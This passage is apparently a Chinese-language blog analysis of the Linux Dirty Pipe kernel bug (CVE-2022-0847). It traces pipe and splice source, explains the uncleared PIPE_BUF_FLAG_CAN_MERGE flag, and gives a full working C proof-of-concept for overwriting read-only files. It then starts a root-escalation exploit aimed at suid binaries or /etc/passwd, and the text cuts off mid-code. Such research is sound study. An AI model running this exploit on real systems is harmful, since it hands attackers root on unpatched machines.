但因为我们没有读到任何东西，若我们打断了，则这时候我们可以直接</span></span><br><span class="line"><span class="comment"> * 返回一个-ERESTARTSYS，</span></span><br><span class="line"><span class="comment"> * 因为我们已经完成了任何所需的环境，没有必要标记任何可访问. </span></span><br><span class="line"><span class="comment"> * 且我们已释放了锁。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line">wake_next_reader = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))</span><br><span class="line">wake_next_reader = <span class="literal">false</span>;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (was_full)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line"><span class="keyword">if</span> (wake_next_reader)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">file_accessed(filp);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以总结：对于一个刚刚建立的管道，其 buffer 数组其实并没有分配对应的页面空间，也没有设置标志位；在我们向管道内写入数据时会通过 buddy system 为对应 buffer 分配新的页框，<strong>并设置 PIPE_BUF_FLAG_CAN_MERGE 标志位，标志该 buffer 可以进行写入</strong>；而当我们从管道中读出数据之后，纵使一个 buffer 对应的 page 上的数据被读完了，我们也不会释放该 page，而可以也会直接投入到下一次使用中，<strong>因此会保留 PIPE_BUF_FLAG_CAN_MERGE 标志位</strong></p><h2 id="splice：文件与管道间数据拷贝"><a href="#splice：文件与管道间数据拷贝" class="headerlink" title="splice：文件与管道间数据拷贝"></a>splice：文件与管道间数据拷贝</h2><p>当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，<strong>具有可观的开销</strong></p><p>因此为了减少这样的开销， <code>splice</code>这一个非常独特的系统调用应运而生，其作用是<strong>在文件与管道之间进行数据拷贝</strong>，以此<strong>将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销</strong></p><p>glibc 中的 wrapper 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">loff_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">               <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure><p>splice 系统调用<strong>本质上是利用管道在内核空间中进行数据拷贝</strong>，毫无疑问的是，管道是一个十分好用的内核缓冲区，于是 splice 系统调用选择使用管道作为中间的数据缓冲区</p><p>当你想要将数据从一个文件描述符拷贝到另一个文件描述符中，只需要先创建一个管道，之后使用 splice 系统调用将数据从源文件描述符拷贝到管道中、再使用 splice 系统调用将数据从管道中拷贝到目的文件描述符即可。这样的设计使得我们只需要两次系统调用便能完成数据在不同文件描述符间的拷贝工作，且<strong>数据的拷贝都在内核空间中完成，极大地减少了开销</strong></p><p>splice 系统调用正式操作前都是一些基础的检查工作，这一块不深入分析，存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_splice()// 检查文件描述符是否可用</span><br><span class="line">__do_splice()// 检查是否入设置了偏移或出设置了偏移（任一则返回）</span><br><span class="line">do_splice()// 分流</span><br></pre></td></tr></table></figure><p>最终文件与管道间的分流发生在 <code>do_splice()</code> 函数：</p><ul><li>从管道读取到管道，调用 <code>splice_pipe_to_pipe()</code></li><li>从文件读取到管道，调用 <code>splice_file_to_pipe()</code></li><li>从管道读取到文件，调用 <code>do_splice_from()</code></li></ul><h3 id="从文件读取到管道"><a href="#从文件读取到管道" class="headerlink" title="从文件读取到管道"></a>从文件读取到管道</h3><p>从文件读取数据到管道的核心原理是：<strong>将 pipe_buffer 对应的 page 设置为文件映射的 page</strong></p><p>存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">splice_file_to_pipe()</span><br><span class="line">do_splice_to()</span><br></pre></td></tr></table></figure><p>在 <code>do_splice_to</code> 中最终会调用到内核文件结构体函数表的 <code>splice_read</code> 指针，对于不同的文件系统而言该函数指针不同，以 ext4 文件系统为例，查表 <code>ext4_file_operations</code>，对应调用的函数应为 <code>generic_file_splice_read</code>，存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">generic_file_splice_read()</span><br><span class="line">    call_read_iter()</span><br></pre></td></tr></table></figure><p>该函数是文件函数表中 <code>read_iter()</code> 的 wrapper，对 ext4 而言对应调用 <code>ext4_file_read_iter</code>，源码比较多，这里只贴出核心调用链，最终调用到核心函数是 <code>filemap_read()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ext4_file_read_iter()</span><br><span class="line">    generic_file_read_iter()</span><br><span class="line">    filemap_read()</span><br><span class="line">    filemap_get_pages()<span class="comment">// 获取到文件对应映射的页面集</span></span><br><span class="line">    copy_page_to_iter()<span class="comment">// 进行页面拷贝（单位为单个页面）</span></span><br><span class="line">    __copy_page_to_iter()</span><br><span class="line">    copy_page_to_iter_pipe()<span class="comment">// 我们是管道，所以走入该分支</span></span><br></pre></td></tr></table></figure><p>最终在 <code>copy_page_to_iter_pipe()</code> 中，将对应的 <code>pipe_buffer-&gt;page</code> 设为<strong>文件映射的页面集的对应页框</strong>，将页框引用计数 + 1（<code>get_page()</code>），这样就完成了一个<strong>从文件读取数据到管道的过程</strong>，因为是直接建立页面的映射，所以每次操作后都会将 head +1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们注意到——该操作<strong>缺失了对 pipe_buffer-&gt;flags 的重新赋值操作</strong></p><h3 id="从管道读取到文件"><a href="#从管道读取到文件" class="headerlink" title="从管道读取到文件"></a>从管道读取到文件</h3><p><code>do_splice_from</code> 最终会调用对应内核文件结构的函数表中的 <code>splice_write()</code> 指针，将 pipe_buffer 数组对应页面上内容读出，写入到文件中，对于不同的文件系统而言该函数指针不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to initiate a splice from pipe to file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_splice_from</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="keyword">struct</span> file *out,</span></span><br><span class="line"><span class="params">   <span class="type">loff_t</span> *ppos, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!out-&gt;f_op-&gt;splice_write))</span><br><span class="line"><span class="keyword">return</span> warn_unsupported(out, <span class="string">&quot;write&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以 ext4 文件系统为例，最终会调用到 <code>iter_file_splice_write</code> 函数，之后存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iter_file_splice_write(）</span><br><span class="line">splice_from_pipe_next()// 检查管道可用性</span><br><span class="line">vfs_iter_write()// 读出管道数据写入文件</span><br><span class="line">do_iter_write()</span><br><span class="line">do_iter_readv_writev()</span><br><span class="line">call_write_iter // 上层传入type为 WRITE，走入该分支</span><br></pre></td></tr></table></figure><p><code>call_write_iter</code> 是文件函数表中 <code>write_iter()</code> 的 wrapper，对 ext4 而言对应调用 <code>ext4_file_write_iter</code>，这里最终只是常规的将 buf 上数据拷贝到文件上的操作，也并非本篇的重点，就不展开分析了</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>我们咋一看好像并没有什么问题，但让我们思考这样一个情景：</p><ul><li>我们将管道整个读写了一轮，此时所有的 pipe_buffer 都保留了 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</li><li>我们利用 splice 将数据从文件读取一个字节到管道上，此时 pipe_buffer 对应的 page 成员<strong>指向文件映射的页面</strong>，但在 splice 中<strong>并未清空 pipe_buffer 的标志位，从而让内核误以为该页面可以被写入</strong></li><li>在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而<strong>将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</li></ul><p>漏洞点便是在于 splice 系统调用中<strong>未清空</strong> <code>pipe_buffer</code> <strong>的标志位，从而将管道页面可写入的状态保留了下来</strong>，这给了我们越权写入只读文件的操作</p><p>我们不难发现这个漏洞与脏牛十分类似，都是能越权对文件进行写入，不同的是脏牛需要去撞条件竞争的概率，而该漏洞<strong>可以稳定触发</strong>，但是脏牛可以直接写整个文件，而<strong>该漏洞不能在管道边界上写入</strong></p><blockquote><p>当然，如果这个文件甚至都是不可读的，那自然是没法利用的（笑），但在主流 Linux 发行版中有着大量的可作为我们攻击目标的文件，例如 suid 程序或 <code>/etc/passwd</code> 等</p></blockquote><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>漏洞利用的步骤其实我们在前面都已经叙述得差不多了，主要就是分三步走：</p><h2 id="Step-I-写、读管道，设置-PIPE-BUF-FLAG-CAN-MERGE-flag"><a href="#Step-I-写、读管道，设置-PIPE-BUF-FLAG-CAN-MERGE-flag" class="headerlink" title="Step.I 写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag"></a>Step.I 写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag</h2><p>为了保证利用能够稳定成功，我们首先新建一个管道，<strong>将管道写满后再将所有数据读出</strong>，这样管道的每一个 <code>pipe_buffer</code> 都会被设置上  <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</p><h2 id="Step-II-splice-建立-pipe-buffer-与文件的关联（漏洞产生点）"><a href="#Step-II-splice-建立-pipe-buffer-与文件的关联（漏洞产生点）" class="headerlink" title="Step.II splice 建立 pipe_buffer 与文件的关联（漏洞产生点）"></a>Step.II splice 建立 pipe_buffer 与文件的关联（漏洞产生点）</h2><p>接下来我们使用 splice 系统调用将数据从目标文件中读入到管道，从而让 <code>pipe_buffer-&gt;page</code> 变为文件在内存中映射的页面，为了让下一次写入数据时写回文件映射的页面，我们应当<strong>读入不多于一个数据的页面</strong>，这里笔者选择读入 1 个字节，这样我们仍能向文件上写入将近一张页面的数据</p><p>当我们完成读入之后，管道的 head 指向下一个 pipe_buffer，因此我们若要写入文件则应当走入到 pipe_write 开头写入上一个 pipe_buffer 的分支，这也是为什么我们在这里只读入一个字节的缘故</p><h2 id="Step-III-向管道中写入恶意数据，完成越权写入文件"><a href="#Step-III-向管道中写入恶意数据，完成越权写入文件" class="headerlink" title="Step.III 向管道中写入恶意数据，完成越权写入文件"></a>Step.III 向管道中写入恶意数据，完成越权写入文件</h2><p>接下来<strong>我们直接向管道中写入数据就能完成对只读文件的越权写入</strong>。在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而<strong>将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>我们使用 qemu 起一个测试环境，看看是否能够利用该漏洞对只读文件进行写入，最终的 poc 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * POC of CVE-2022-0847</span></span><br><span class="line"><span class="comment"> * written by arttnba3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span>page_size;</span><br><span class="line"><span class="type">size_t</span>offset_in_file;</span><br><span class="line"><span class="type">size_t</span> data_size;</span><br><span class="line"><span class="type">int</span> target_file_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">target_file_stat</span>;</span></span><br><span class="line"><span class="type">int</span>pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> pipe_size;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">// checking before we start to exploit</span></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Usage: ./exp target_file offset_in_file data&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">offset_in_file = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (offset_in_file % page_size == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Cannot write on the boundary of a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line">target_file_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (target_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Failed to open the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fstat(target_file_fd, &amp;target_file_stat))</span><br><span class="line">errExit(<span class="string">&quot;Failed to get the info of the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset_in_file &gt; target_file_stat.st_size)</span><br><span class="line">errExit(<span class="string">&quot;Offset is not in the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">data_size = <span class="built_in">strlen</span>(argv[<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">if</span> ((offset_in_file + data_size) &gt; target_file_stat.st_size)</span><br><span class="line">errExit(<span class="string">&quot;Cannot enlarge the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((offset_in_file % page_size) + data_size) &gt; page_size)</span><br><span class="line">errExit(<span class="string">&quot;Cannot write accross a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit now...</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span></span><br><span class="line"><span class="comment"> * Just write and read through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">pipe_size = fcntl(pipe_fd[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">buffer = (<span class="type">char</span>*) <span class="built_in">malloc</span>(page_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= write(pipe_fd[<span class="number">1</span>], buffer, per_write);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= read(pipe_fd[<span class="number">0</span>], buffer, per_read);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use the splice to make the pipe_buffer-&gt;page</span></span><br><span class="line"><span class="comment"> * become the page of the file mapped, by read</span></span><br><span class="line"><span class="comment"> * a byte from the file accross the splice</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);</span><br><span class="line">offset_in_file--;<span class="comment">// we read a byte, so offset should minus 1</span></span><br><span class="line">retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;splice failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;short splice!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Now it comes to the time of exploit:</span></span><br><span class="line"><span class="comment"> * the mapped page of file has been in pipe_buffer,</span></span><br><span class="line"><span class="comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span></span><br><span class="line"><span class="comment"> * just a simple write can make the exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">retval = write(pipe_fd[<span class="number">1</span>], argv[<span class="number">3</span>], data_size);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Write failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval &lt; data_size)</span><br><span class="line">errExit(<span class="string">&quot;Short write!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，发现我们成功地覆写了只读文件</p><p><img src="https://s2.loli.net/2022/03/12/vOGZw2Qt9VRsYDd.png" alt="image.png"></p><h1 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03.提权"></a>0x03.提权</h1><p>漏洞的利用形式与“脏牛”基本上是一样的：覆写 <code>/etc/passwd</code> 或者覆写一些 suid 程序进行提权，这里就不过多赘叙了</p><h2 id="suid-提权"><a href="#suid-提权" class="headerlink" title="suid 提权"></a>suid 提权</h2><p>笔者现给出一个修改指定 suid 程序进行提权的 exp，使用 msfvenom 生成运行 <code>/bin/sh</code> 的 shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 